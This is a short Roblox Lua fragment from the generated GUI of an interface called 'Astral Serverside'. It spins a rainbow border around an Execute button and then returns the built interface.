-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border.Rainbow.Rotation
local function C_43()
local script = ASTRAL["43"];
	while true do
		script.Parent.Rotation = script.Parent.Rotation + 4
		wait()
		if script.Parent.Rotation == 360 or script.Parent.Rotation > 360 then
			script.Parent.Rotation = 0
		end
	end
end;
task.spawn(C_43);

return ASTRAL["1"], require;
